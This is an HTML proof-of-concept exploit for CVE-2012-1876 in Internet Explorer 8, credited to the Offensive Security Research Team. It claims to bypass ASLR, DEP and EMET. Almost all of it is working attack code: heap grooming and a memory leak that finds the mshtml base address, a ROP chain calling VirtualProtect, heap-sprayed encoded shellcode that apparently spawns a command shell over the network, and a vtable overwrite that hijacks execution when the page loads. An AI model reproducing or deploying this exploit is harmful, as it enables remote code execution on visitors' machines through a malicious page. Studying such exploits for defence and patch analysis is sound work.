<!--
** Internet Explorer 8 Fixed Col Span ID full ASLR, DEP and EMET 4.1.X bypass
** Offensive Security Research Team
** http://www.offensive-security.com/vulndev/disarming-enhanced-mitigation-experience-toolkit-emet
** Affected Software: Internet Explorer 8
** Vulnerability: Fixed Col Span ID
** CVE: CVE-2012-1876
** Tested on Windows 7 (x86) - IE 8.0.7601.17514 & EMET 4.1.X
-->

<html>
<head>
    <title>CVE-2012-1876</title>
</head>
<body>
<div ID="evil"></div>
<table style="table-layout:fixed" >
    <col id="199" width="41" span="9" >&nsp</col>
</table>


<script language="javascript">

    var free = "EEEE";
    while (free.length<500) free +=free;
    <!--document.write( "EEEE length is " + free.length + "<br>")-->;

    var string1 = "AAAA";
    while (string1.length<500) string1 +=string1;

    var string2 = "BBBB";
    while (string2.length<500) string2 +=string2;

    var fr = new Array();
    var al = new Array();
    var bl = new Array();

    var div_container = document.getElementById("evil");
    div_container.style.cssText = "display:none";

    for (var i = 0 ; i < 500 ; i += 2)
    {
        fr[i] = free.substring(0,(0x100-6)/2);
        al[i] = string1.substring(0,(0x100-6)/2);
        bl[i] = string2.substring(0,(0x100-6)/2);
        var obj = document.createElement("button");
        div_container.appendChild(obj);
    }

    //alert("Will Be Freed!");

    for (var j=200; j<500; j+=2 ) {
        fr[j] = null;
        CollectGarbage();
    }

    //alert("Section One: Freed!");

</script>

<table style="table-layout:fixed" ><col id="0" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="1" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="2" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="3" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="4" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="5" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="6" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="7" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="8" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="9" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="10" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="11" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="12" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="13" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="14" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="15" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="16" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="17" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="18" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="19" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="20" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="21" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="22" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="23" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="24" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="25" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="26" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="27" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="28" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="29" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="30" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="31" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="32" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="33" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="34" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="35" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="36" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="37" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="38" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="39" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="40" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="41" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="42" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="43" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="44" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="45" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="46" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="47" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="48" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="49" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="50" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="51" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="52" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="53" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="54" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="55" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="56" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="57" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="58" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="59" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="60" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="61" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="62" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="63" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="64" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="65" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="66" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="67" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="68" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="69" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="70" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="71" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="72" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="73" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="74" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="75" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="76" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="77" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="78" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="79" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="80" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="81" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="82" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="83" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="84" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="85" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="86" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="87" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="88" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="89" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="90" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="91" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="92" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="93" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="94" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="95" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="96" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="97" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="98" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="99" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="100" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="101" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="102" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="103" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="104" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="105" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="106" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="107" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="108" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="109" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="110" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="111" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="112" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="113" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="114" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="115" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="116" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="117" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="118" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="119" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="120" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="121" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="122" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="123" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="124" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="125" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="126" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="127" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="128" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="129" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="130" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="131" width="41" span="9" >&nbsp </col></table><table style="table-layout:fixed" ><col id="132" width="41" span="9" >&nbsp </col></table>

<script>

    function leak() {
        //alert("Section Two:Will Be Occupy!");
        var obj_col = document.getElementById("131");
        obj_col.width = "41";
        obj_col.span = 19; //19*1c = 0x214 -4 = 0x210
        //alert("Section Two: Occupy!");
    }

    function get_leak(){
        var leak_addr = -1;
        for(var i = 0;i<500;i+=2)
        {
            if (bl[i].length > (0x100-6)/2)
            {
                alert(i/2);//242,107*3,108*2,141
                //alert(bl[i].length*2);//65608,0x10048
                leak_index = i;
                var leak = bl[i].substring((0x100-6+2+8)/2,(0x100-6+2+8+4)/2);//0x100-6是到最后一个元素，也就是字符0之前那个元素，所以再+2个0字符，再加8个字节头
                leak_addr = parseInt(leak.charCodeAt(1).toString(16)+leak.charCodeAt(0).toString(16),16);
                mshtmlbase = leak_addr - Number(0x1584f8);
                //alert(leak_addr.toString(16));//658684f8,1703314680
                alert(mshtmlbase.toString(16));//6571000,1701904384
                break;
            }
        }

        if ( leak_addr == -1 || leak_index == -1)
        {
            alert("memory leak failed....");
        }

    }

    function heap_spray(mshtmlbase) {
        alert("heap_spray"+ mshtmlbase.toString(16));
        CollectGarbage();

        var rop = mshtmlbase +  0x420290  //0x68790290
        var rop = rop.toString(16);
        var rop1 = rop.substring(4,8);
        var rop2 = rop.substring(0,4); //# RET

        var rop = mshtmlbase + 0x4B015A;//0x6882015a
        var rop = rop.toString(16);
        var rop3 = rop.substring(4,8);
        var rop4 = rop.substring(0,4); //# POP EBP # RETN

        var rop = mshtmlbase + 0x701BE;//0x683e01be
        var rop = rop.toString(16);
        var rop5 = rop.substring(4,8);
        var rop6 = rop.substring(0,4); // XCHG EAX,ESP;RETN

        var rop = mshtmlbase + 0x3DA668;//0x6874a668
        var rop = rop.toString(16);
        var rop7 = rop.substring(4,8);
        var rop8 = rop.substring(0,4); // # POP EBP # RETN

        var rop = mshtmlbase + 0x3DA668;//0x6874a668
        var rop = rop.toString(16);
        var rop9 = rop.substring(4,8);
        var rop10 = rop.substring(0,4); //# skip 4 bytes, # POP EBP # RETN

        var rop = mshtmlbase + 0x4352A4;//0x687a52a4
        var rop = rop.toString(16);
        var rop11 = rop.substring(4,8);
        var rop12 = rop.substring(0,4); //,# POP EAX # RETN

        var rop = mshtmlbase + 0x97C8FDFF;//0xfffffdff
        var rop = rop.toString(16);
        var rop13 = rop.substring(4,8);
        var rop14 = rop.substring(0,4); //# Value to negate, will become 0x00000201

        var rop = mshtmlbase + 0x3ED5EB;//0x6875d5eb
        var rop = rop.toString(16);
        var rop15 = rop.substring(4,8);
        var rop16 = rop.substring(0,4); //# NEG EAX #

        var rop = mshtmlbase + 0x27E023;//0x685ee023
        var rop = rop.toString(16);
        var rop17 = rop.substring(4,8);
        var rop18 = rop.substring(0,4); //# XCHG EAX,EBX # RETN

        var rop = mshtmlbase + 0x38B0E;//0x683a8b0e
        var rop = rop.toString(16);
        var rop19 = rop.substring(4,8);
        var rop20 = rop.substring(0,4); //# POP EAX # RETN

        var rop = mshtmlbase + 0x97C8FFC0;// 0xffffffc0
        var rop = rop.toString(16);
        var rop21 = rop.substring(4,8);
        var rop22 = rop.substring(0,4); //# Value to negate, will become 0x00000040


//////////////////////////////////////////////
        var rop = mshtmlbase + 0x1A36AF;//0x685136af
        var rop = rop.toString(16);
        var rop23 = rop.substring(4,8);
        var rop24 = rop.substring(0,4); //# NEG EAX # RETN

        var rop = mshtmlbase + 0x3C8CCD;//0x68738ccd
        var rop = rop.toString(16);
        var rop25 = rop.substring(4,8);
        var rop26 = rop.substring(0,4); //# XCHG EAX,EDX # RETN

        var rop = mshtmlbase + 0x1409A7;//0x684b09a7
        var rop = rop.toString(16);
        var rop27 = rop.substring(4,8);
        var rop28 = rop.substring(0,4); //# POP ECX # RETN

        var rop = mshtmlbase + 0x53FFCE ;//0x688affce
        var rop = rop.toString(16);
        var Writable1 = rop.substring(4,8);
        var Writable2 = rop.substring(0,4); //&Writable location [mshtml.dll]

        var rop = mshtmlbase + 0x152C0E;//0x684c2c0e
        var rop = rop.toString(16);
        var rop29 = rop.substring(4,8);
        var rop30 = rop.substring(0,4); //## POP EDI # RETN

        var rop = mshtmlbase + 0x1838E2;//0x684f38e2
        var rop = rop.toString(16);
        var rop43 = rop.substring(4,8);
        var rop44 = rop.substring(0,4); //# RETN (ROP NOP)


        var rop = mshtmlbase + 0x39BA2B;//0x6870ba2b
        var rop = rop.toString(16);
        var rop31 = rop.substring(4,8);
        var rop32 = rop.substring(0,4); //# POP ESI # RETN

        var rop = mshtmlbase + 0xc0a3;//0x6837c0a3
        var rop = rop.toString(16);
        var rop33 = rop.substring(4,8);
        var rop34 = rop.substring(0,4); //# # JMP [EAX]

        var rop = mshtmlbase + 0x274206;// 0x685e4206
        var rop = rop.toString(16);
        var rop35 = rop.substring(4,8);
        var rop36 = rop.substring(0,4); //#POP EAX # RETN


        var rop = mshtmlbase + 0x1348;//0x68371348
        var rop = rop.toString(16);
        var rop37 = rop.substring(4,8);
        var rop38 = rop.substring(0,4); //# ptr to &VirtualProtect()

        var rop = mshtmlbase + 0x5F4F3;//0x683cf4f3
        var rop = rop.toString(16);
        var rop39 = rop.substring(4,8);
        var rop40 = rop.substring(0,4); //# PUSHAD # RETN

        var rop = mshtmlbase + 0xAEE0E;// 0x6841ee0e
        var rop = rop.toString(16);
        var rop41 = rop.substring(4,8);
        var rop42 = rop.substring(0,4); // ptr to 'jmp esp'


        //var shellcode = unescape("%u4141%u4141%u4242%u4242%u4343%u4343"); // PADDING
        //shellcode+= unescape("%u4141%u4141%u4242%u4242%u4343%u4343"); // PADDING
        //shellcode+= unescape("%u4141%u4141"); // PADDING
        var shellcode ="";
        shellcode+= unescape("%u"+rop1+"%u"+rop2); // RETN                  //esp:07070024 //esp在这里，2
        shellcode+= unescape("%u"+rop3+"%u"+rop4); // POP EBP # RETN        //esp:07070028//3
        shellcode += unescape("%u"+rop5+"%u"+rop6); // XCHG EAX,ESP # RETN //1:esp:0707002c//1

// Performing a standard Kumeh maneuver ... (VirtualProtect mona chain)
        shellcode+= unescape("%u"+rop7+"%u"+rop8); // POP EBP,RETN   //esp:07070030//4
        shellcode+= unescape("%u"+rop9+"%u"+rop10); // skip 4 bytes  // # POP EBP # RETN
        shellcode+= unescape("%u"+rop11+"%u"+rop12); // POP EAX # RETN  //esp:07070038//5
        shellcode+= unescape("%u"+rop13+"%u"+rop14); // Value to negate, will become 0x00000201 //
        shellcode+= unescape("%u"+rop15+"%u"+rop16); // NEG EAX # RETN  //esp:07070040//6
        shellcode+= unescape("%u"+rop17+"%u"+rop18); // XCHG EAX,EBX # RETN //esp:07070044//7
        shellcode+= unescape("%u"+rop19+"%u"+rop20); //# POP EAX # RETN//esp:07070048//8
        shellcode+= unescape("%u"+rop21+"%u"+rop22); //  Value to negate, will become 0x00000040
        shellcode+= unescape("%u"+rop23+"%u"+rop24); // # NEG EAX # RETN //esp:07070050//9
        shellcode+= unescape("%u"+rop25+"%u"+rop26); //# XCHG EAX,EDX # RETN//esp:07070054//10
        shellcode+= unescape("%u"+rop27+"%u"+rop28); //# POP ECX # RETN//esp:07070058//11
        shellcode+= unescape("%u"+Writable1+"%u"+Writable2); //# &Writable location
        shellcode+= unescape("%u"+rop29+"%u"+rop30); // # POP EDI # RETN////esp:07070060//12
        shellcode+= unescape("%u"+rop43+"%u"+rop44); // ,# RETN (ROP NOP)
        shellcode+= unescape("%u"+rop31+"%u"+rop32); // # POP ESI # RETN//esp:07070068//13
        shellcode+= unescape("%u"+rop33+"%u"+rop34); //# JMP [EAX]
        shellcode+= unescape("%u"+rop35+"%u"+rop36); // # # POP EAX//esp:07070070//14
        shellcode+= unescape("%u"+rop37+"%u"+rop38); // # ptr to &VirtualProtect()
        shellcode+= unescape("%u"+rop39+"%u"+rop40);// # PUSHAD # RETN //esp:07070078//15
        shellcode+= unescape("%u"+rop41+"%u"+rop42);//# ptr to 'jmp esp'

        shellcode+= unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b" +
            "%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a" +
            "%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf" +
            "%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001" +
            "%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18" +
            "%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31" +
            "%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03" +
            "%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66" +
            "%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489" +
            "%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a" +
            "%ueb12%u5d86%u3368%u0032%u6800%u7377%u5f32" +
            "%u6854%u774c%u0726%ud5ff%u90b8%u0001%u2900" +
            "%u54c4%u6850%u8029%u006b%ud5ff%u5050%u5050" +
            "%u5040%u5040%uea68%udf0f%uffe0%u89d5%u31c7" +
            "%u53db%u0268%u1100%u895c%u6ae6%u5610%u6857" +
            "%udbc2%u6737%ud5ff%u5753%ub768%u38e9%uffff" +
            "%u53d5%u5753%u7468%u3bec%uffe1%u57d5%uc789" +
            "%u7568%u4d6e%uff61%u68d5%u6d63%u0064%ue389" +
            "%u5757%u3157%u6af6%u5912%ue256%u66fd%u44c7" +
            "%u3c24%u0101%u448d%u1024%u00c6%u5444%u5650" +
            "%u5656%u5646%u564e%u5356%u6856%ucc79%u863f" +
            "%ud5ff%ue089%u564e%uff46%u6830%u8708%u601d" +
            "%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff" +
            "%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72" +
            "%u006a%uff53%u41d5");

        var padding = unescape("%u9090");//1

        while (padding.length < 1000)
            padding = padding + padding;//1024
        var padding = padding.substr(0, 1000 - shellcode.length);

        shellcode+= padding;//1000

        while (shellcode.length < 100000)
            shellcode = shellcode + shellcode;//128000

        var onemeg = shellcode.substr(0, 64*1024/2);//32768

        for (i=0; i<14; i++) {
            onemeg += shellcode.substr(0, 64*1024/2);//491520
        }

        onemeg += shellcode.substr(0, (64*1024/2)-(38/2));//524269

        var spray = new Array();

        for (i=0; i<100; i++) {
            spray[i] = onemeg.substr(0, onemeg.length);//524269
        }
    }


    function smash_vtable() {
        alert("Section Tree: Will Be Smash_vtable!");
        if ( leak_index==-1)
        {
            return;
        }
        var obj_col = document.getElementById("131");
        obj_col.width = "1178993"; // smash the vftable 0x07070024
        obj_col.span  = 29;         // 29*1C = 32C - 4 = 328 ，最远到328,实际在318就被覆盖为了0x07070024
        alert("Section Tree: smash_vtable!");
    }

    var mshtmlbase = 0;
    var leak_index = -1;
    setTimeout(function(){leak()}, 1);
    setTimeout(function(){get_leak()}, 400);
    setTimeout(function(){heap_spray(mshtmlbase)}, 1600);
    setTimeout(function(){smash_vtable()}, 2400);

</script>
</body>
</html>
